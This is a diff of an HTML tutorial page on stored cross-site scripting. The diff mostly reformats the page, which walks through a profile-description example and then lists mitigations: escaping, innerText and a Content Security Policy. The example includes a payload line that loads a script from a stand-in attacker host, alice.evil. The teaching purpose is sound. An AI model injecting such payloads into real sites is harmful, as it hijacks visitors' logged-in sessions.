@@ -127,7 +127,14 @@
 </div>
 
 
-      <p>Let’s say that Bob owns a social website that allows users to personalize their profiles.</p><p>Alice goes to Bob’s website, creates an account, and goes to her profile settings. She sets her profile description to <code>I&#x27;m actually too lazy to write something here.</code></p><p>When her friends view her profile, this code gets run on the server:</p>
+      
+<p>Let’s say that Bob owns a social website that allows users to personalize their profiles.
+</p>
+<p>Alice goes to Bob’s website, creates an account, and goes to her profile settings. She sets her profile description to <code>I&#x27;m actually too lazy to write something here.</code>
+</p>
+<p>When her friends view her profile, this code gets run on the server:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">if(viewedPerson.profile.description){
@@ -139,7 +146,10 @@
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>Resulting in this HTML:</p>
+</div>
+<p>Resulting in this HTML:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">&lt;div&gt;I&#39;m actually too lazy to write something here.&lt;/div&gt;</pre>
@@ -147,7 +157,18 @@
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>Than Alice sets her profile description to <code>&lt;b&gt;I like HTML&lt;/b&gt;</code>. When she visits her profile, instead of seeing</p><blockquote id="9b92b6c0-db0e-44f9-abe8-1af532eb5c85" class="">&lt;b&gt;I like HTML&lt;/b&gt;</blockquote><p>she sees</p><blockquote id="78a64143-a4ef-415b-9ad6-3b74a9da04c3" class="">I like HTML</blockquote><p>Then Alice sets her profile to</p>
+</div>
+<p>Than Alice sets her profile description to <code>&lt;b&gt;I like HTML&lt;/b&gt;</code>. When she visits her profile, instead of seeing
+</p>
+<blockquote id="9b92b6c0-db0e-44f9-abe8-1af532eb5c85" class="">&lt;b&gt;I like HTML&lt;/b&gt;
+</blockquote>
+<p>she sees
+</p>
+<blockquote id="78a64143-a4ef-415b-9ad6-3b74a9da04c3" class="">I like HTML
+</blockquote>
+<p>Then Alice sets her profile to
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">&lt;script src = &#34;https://alice.evil/profile_xss.js&#34;&gt;&lt;/script&gt;I&#39;m actually too lazy to write something here.</pre>
@@ -155,7 +176,20 @@
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>Whenever someone visits her profile, they get Alice’s script run on Bob’s website while logged on as their account.</p><h1 id="d03a4855-3e44-4db3-81b8-06f521052e6d" class="">Mitigation<a class="header-anchor" href="#d03a4855-3e44-4db3-81b8-06f521052e6d" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M5.88.03c-.18.01-.36.03-.53.09-.27.1-.53.25-.75.47a.5.5 0 1 0 .69.69c.11-.11.24-.17.38-.22.35-.12.78-.07 1.06.22.39.39.39 1.04 0 1.44l-1.5 1.5c-.44.44-.8.48-1.06.47-.26-.01-.41-.13-.41-.13a.5.5 0 1 0-.5.88s.34.22.84.25c.5.03 1.2-.16 1.81-.78l1.5-1.5c.78-.78.78-2.04 0-2.81-.28-.28-.61-.45-.97-.53-.18-.04-.38-.04-.56-.03zm-2 2.31c-.5-.02-1.19.15-1.78.75l-1.5 1.5c-.78.78-.78 2.04 0 2.81.56.56 1.36.72 2.06.47.27-.1.53-.25.75-.47a.5.5 0 1 0-.69-.69c-.11.11-.24.17-.38.22-.35.12-.78.07-1.06-.22-.39-.39-.39-1.04 0-1.44l1.5-1.5c.4-.4.75-.45 1.03-.44.28.01.47.09.47.09a.5.5 0 1 0 .44-.88s-.34-.2-.84-.22z"></path></svg></a></h1><ol id="827d8ffe-2cff-41fe-b842-cd43069e9541" class="numbered-list" start="1"><li>Escape angle brackets in profile descriptions, etc.</li><li>Store profile descriptions in a plain text file that is then fetched with a script that adds the description via <code>.innerText</code></li><li><strong>Add a </strong><a href="https://stackoverflow.com/q/30280370/6560716"><strong>Content Security Policy</strong></a><strong> that refuses to load active content from other domains</strong></li></ol>
+</div>
+<p>Whenever someone visits her profile, they get Alice’s script run on Bob’s website while logged on as their account.
+</p>
+  <h1 id="d03a4855-3e44-4db3-81b8-06f521052e6d" class="">Mitigation
+  <a class="header-anchor" href="#d03a4855-3e44-4db3-81b8-06f521052e6d" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M5.88.03c-.18.01-.36.03-.53.09-.27.1-.53.25-.75.47a.5.5 0 1 0 .69.69c.11-.11.24-.17.38-.22.35-.12.78-.07 1.06.22.39.39.39 1.04 0 1.44l-1.5 1.5c-.44.44-.8.48-1.06.47-.26-.01-.41-.13-.41-.13a.5.5 0 1 0-.5.88s.34.22.84.25c.5.03 1.2-.16 1.81-.78l1.5-1.5c.78-.78.78-2.04 0-2.81-.28-.28-.61-.45-.97-.53-.18-.04-.38-.04-.56-.03zm-2 2.31c-.5-.02-1.19.15-1.78.75l-1.5 1.5c-.78.78-.78 2.04 0 2.81.56.56 1.36.72 2.06.47.27-.1.53-.25.75-.47a.5.5 0 1 0-.69-.69c-.11.11-.24.17-.38.22-.35.12-.78.07-1.06-.22-.39-.39-.39-1.04 0-1.44l1.5-1.5c.4-.4.75-.45 1.03-.44.28.01.47.09.47.09a.5.5 0 1 0 .44-.88s-.34-.2-.84-.22z"></path></svg></a>
+  </h1>
+  <ol id="827d8ffe-2cff-41fe-b842-cd43069e9541" class="numbered-list" start="1">
+    <li>Escape angle brackets in profile descriptions, etc.
+    </li>
+    <li>Store profile descriptions in a plain text file that is then fetched with a script that adds the description via <code>.innerText</code>
+    </li>
+    <li><strong>Add a </strong><a href="https://stackoverflow.com/q/30280370/6560716"><strong>Content Security Policy</strong></a><strong> that refuses to load active content from other domains</strong>
+    </li>
+  </ol>
 
       <div class="forum-link">
   Found a mistake? Have a question or improvement idea?
